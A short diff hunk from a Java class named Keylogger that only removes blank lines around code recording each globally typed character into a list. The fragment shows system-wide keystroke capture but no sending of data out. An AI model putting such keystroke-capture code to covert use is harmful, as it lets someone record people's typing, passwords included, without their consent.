@@ -30,9 +30,7 @@ public class Keylogger implements NativeKeyListener {
 	public void nativeKeyTyped(NativeKeyEvent arg0) {		
 		try {					
 			char ckey = arg0.getKeyChar();
-			
 			Activities.add(new Key(ckey));
-			
 		} catch (Exception e) {
 			System.err.println("Error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
 		}
